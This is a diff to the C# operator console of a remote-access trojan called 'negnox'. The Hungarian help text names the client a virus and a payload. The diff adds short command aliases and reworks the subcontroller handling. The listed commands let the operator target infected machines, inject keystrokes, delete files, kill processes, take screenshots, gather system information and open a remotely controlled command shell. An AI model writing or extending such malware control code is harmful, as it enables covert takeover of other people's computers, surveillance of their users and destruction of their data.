@@ -30,26 +30,26 @@ namespace negnox.Classok
                 case "help":
 
                     string helpuzenet = @"|//célpontok|
-target       - beállítja a célpontot
-rtarget      - vissza állítja hogy ne legyen célpont
-settarget    - grafikus felületű célpont beállítás
+target       - beállítja a célpontot                 ÷(t)÷
+rtarget      - vissza állítja hogy ne legyen célpont ÷(rt)÷
+settarget    - grafikus felületű célpont beállítás   ÷(st)÷
 lsc          - kilistázza a klienseket
 |//parancsok amik nem küldenek vissza semmit|
-setwallpaper - beállít egy hátteret ("")
+setwallpaper - beállít egy hátteret ("")              ÷(sw)÷
 kys          - le killeli a futó payloadot
 update       - le frissíti a futó payloadot
 delete       - kitöröl fájlokat ("")
-msgbox       - megjelenít egy üzenetet ([])
+msgbox       - megjelenít egy üzenetet ([])          ÷(msgb)÷
 mousex       - elmozgatja az egeret x tengelyen
 mousey       - elmozgatja az egeret y tengelyen
-keystroke    - lenyomja az adott gombokat ("")
+keystroke    - lenyomja az adott gombokat ("")        ÷(ks)÷
 kill         - bezár futó alkalmazásokat ("")
-processS     - elindít egy új Process-t ("")
+processS     - elindít egy új Process-t ("")          ÷(sp)÷
 logoff       - kijelentkezteti a felhasználót
 shutdown     - lekapcsolja a gépet
 restart      - újraindítja a gépet
 audio [100]  - beállítja a hangerőt (itt pl 100-ra)
-subcontroller- kezeli (ha van) másik ip címeken futó negnox kliensekre csatlakozást
+subcontroller- kezeli (ha van) másik ip címeken futó negnox kliensekre csatlakozást ÷(sc)÷
 reloadclient - újra indítja a már futó vírust
 |//lokális parancsok|
 cdme         - könyvtárat vált ("")
@@ -70,7 +70,7 @@ grp          - vissza küld jelet hogy még él e a gép         [$célpont spec
 fsi          - fetch system info                             [$célpont specifikus!$]
 frp          - fetch running processes                       [$célpont specifikus!$]
 fsc          - fetch screens                                 [$célpont specifikus!$]
-screenshot   - csinál egy képernyőképet                      [$célpont specifikus!$]
+screenshot   - csinál egy képernyőképet        ÷(scr)÷       [$célpont specifikus!$]
 |//beépített programok|
 rShello      - távolról vezérelhető cmd-t nyit               [$célpont specifikus!$]
              - először telepítés : ÷exet ""rSL.exe""÷
@@ -81,6 +81,7 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
                     break;
 
                 case "target":
+                case "t":
                     if (xSplittelve.Length == 1)
                     {
                         if (vanTarget) Log($"Célpont : |{targetIp}|");
@@ -97,6 +98,7 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
 
                     break;
                 case "rtarget":
+                case "rt":
                     targetIp = "";
 
                     File.WriteAllText("target.n", "");
@@ -105,6 +107,8 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
                     vanTarget = false;
                     break;
                 case "setwallpaper":
+                case "sw":
+
 
                     Send("setwallpaper");
                     Send(bemenetek[1]);
@@ -148,6 +152,7 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
 
                 case "starget":
                 case "settarget":
+                case "st":
                     string[] ipk = kliensek.Select(i => i.Client.RemoteEndPoint.ToString()).ToArray();
                     int valasztas = konzolmenu.MenuLista(ipk, 65, 20, 23, 12,
                         ConsoleColor.Black, ConsoleColor.Gray, ConsoleColor.Gray, ConsoleColor.Green, konzolmenuFejlesztes.Orientation.vertical, true, true) - 1;
@@ -162,6 +167,7 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
                     Console.Title = $"Negnox Console target:{targetIp}";
                     break;
                 case "msgbox":
+                case "msgb":
                     Send("msgbox");
                     Send(bemenet);
                     break;
@@ -193,6 +199,7 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
                     Send(xSplittelve[1]);
                     break;
                 case "keystroke":
+                case "ks":
                     Send("keystroke");
                     Send(bemenet);
                     break;
@@ -209,6 +216,7 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
 
 
                 case "processS":
+                case "sp":
                     if (!bemenet.StartsWith("\"") || !bemenet.Contains("\""))
                     {
                         Log("$Nem helyes a szintaxis!$");
@@ -516,23 +524,40 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
 
 
                 case "subcontroller":
+                case "sb":
                     //if (!CheckTargetEnabled()) break;
-                    Send("subcontroller");
+                    
+                    if (xSplittelve.Length==1)
+                    {
+                        Console.ForegroundColor = ConsoleColor.Yellow;
+                        Console.WriteLine("subcontroller add 'ip cím'    - hozzá ad egy új ipt");
+                        Console.WriteLine("subcontroller remove 'ip cím' - eltávolítja a bizonyos ip-t");
+                        Console.WriteLine("subcontroller list 'ip cím'   - kilistázza hány negnox serverre próbál csatlakozni");
+
+                        Console.ForegroundColor = ConsoleColor.Gray;
+                        //Send("-");
+                        break;
+
+                    }
                     switch (xSplittelve[1])
                     {
                         case "add":
+                            Send("subcontroller");
                             Send($"add {xSplittelve[2]}");
                             break;
                         case "remove":
+                            Send("subcontroller");
                             Send($"remove {xSplittelve[2]}");
                             break;
                         case "list":
+                            Send("subcontroller");
                             Send($"list");
                             break;
                         default:
                             Console.WriteLine("subcontroller add 'ip cím'    - hozzá ad egy új ipt");
                             Console.WriteLine("subcontroller remove 'ip cím' - eltávolítja a bizonyos ip-t");
                             Console.WriteLine("subcontroller list 'ip cím'   - kilistázza hány negnox serverre próbál csatlakozni");
+                            Send("subcontroller");
                             Send("-");
                             break;
                     }
